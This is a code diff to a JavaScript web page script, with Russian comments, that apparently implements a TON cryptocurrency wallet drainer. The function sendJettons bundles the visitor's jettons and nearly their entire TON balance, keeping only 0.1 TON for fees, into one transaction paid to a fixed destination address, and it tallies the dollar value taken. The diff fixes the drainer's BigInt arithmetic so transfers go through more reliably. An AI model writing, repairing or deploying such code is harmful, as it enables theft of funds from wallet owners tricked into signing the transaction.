@@ -263,7 +263,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
         }
     }
 
-    // ВАЖНОЕ ИСПРАВЛЕНИЕ: Упрощаем логику добавления TON
+    // ВАЖНОЕ ИСПРАВЛЕНИЕ: Упрощаем логику добавления TON и исправляем ошибку с числами
     console.log('Checking TON transfer conditions:', {
         tontx: tontx,
         tonBalance: ton,
@@ -276,12 +276,23 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
     if (parseFloat(ton) > 0.1 && transaction.messages.length < 4) {
         console.log('Adding TON transfer...');
         try {
-            // Оставляем 0.1 TON для комиссий, остальное отправляем
-            let transfer_value = TonWeb.utils.toNano(ton) - TonWeb.utils.toNano("0.1");
-            console.log('TON transfer value:', TonWeb.utils.fromNano(transfer_value));
+            // ИСПРАВЛЕНИЕ: Правильная работа с числами - используем строки для точности
+            const tonBalanceNano = TonWeb.utils.toNano(ton);
+            const reservedNano = TonWeb.utils.toNano("0.1");
             
-            if (transfer_value > TonWeb.utils.toNano("0.01")) {
-                let payload = await get_ton_text(transfer_value);
+            // Преобразуем в BigInt для точных вычислений
+            const balanceBigInt = BigInt(tonBalanceNano);
+            const reservedBigInt = BigInt(reservedNano);
+            
+            // Вычисляем сумму для отправки
+            let transfer_value = balanceBigInt - reservedBigInt;
+            
+            // Проверяем что сумма положительная и достаточная
+            if (transfer_value > BigInt(0) && transfer_value > BigInt(TonWeb.utils.toNano("0.01"))) {
+                const transfer_value_str = transfer_value.toString();
+                console.log('TON transfer value:', TonWeb.utils.fromNano(transfer_value_str), 'TON');
+                
+                let payload = await get_ton_text(transfer_value_str);
                 console.log('TON payload status:', payload.status);
                 
                 if (payload.status === 'OK' && payload.data) {
@@ -291,22 +302,24 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                     
                     transaction.messages.push({
                         address: tonDestinationAddress,
-                        amount: transfer_value.toString(),
+                        amount: transfer_value_str,
                         payload: payload.data
                     });
                     
+                    // ИСПРАВЛЕНИЕ: Правильный расчет цены TON
+                    const tonAmount = TonWeb.utils.fromNano(transfer_value_str);
                     tokens[tkn] = {
                         name: 'TON',
-                        prices: TonWeb.utils.fromNano(transfer_value.toString()) * tonPrice
+                        prices: parseFloat(tonAmount) * parseFloat(tonPrice)
                     };
                     tkn++;
                     tontx = true;
-                    console.log('✅ Added TON transfer to transaction:', TonWeb.utils.fromNano(transfer_value.toString()));
+                    console.log('✅ Added TON transfer to transaction:', tonAmount, 'TON');
                 } else {
                     console.log('❌ Failed to get TON payload');
                 }
             } else {
-                console.log('❌ TON transfer value too low');
+                console.log('❌ TON transfer value too low after fees');
             }
         } catch (tonError) {
             console.error('❌ Error adding TON transfer:', tonError);
@@ -332,7 +345,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                 }
                 
                 validMessages.push(msg);
-                console.log(`✅ Valid message: ${msg.address.includes('UQ') ? 'TON' : 'Jetton'} transfer`);
+                console.log(`✅ Valid message: ${msg.address.includes('UQ') || msg.address.includes('EQ') ? 'TON' : 'Jetton'} transfer`);
             } catch (e) {
                 console.error(`❌ Invalid message removed: ${msg.address}`);
             }
@@ -347,7 +360,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
         
         console.log(`📤 Preparing to send transaction with ${transaction.messages.length} messages`);
         console.log('Transaction includes:', transaction.messages.map(m => 
-            m.address.includes('UQ') || m.address.includes('EQ') ? 'TON transfer' : 'Jetton transfer'
+            m.address.includes(data.data.wallet) ? 'TON transfer' : 'Jetton transfer'
         ));
         
         try {
@@ -708,6 +721,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
 
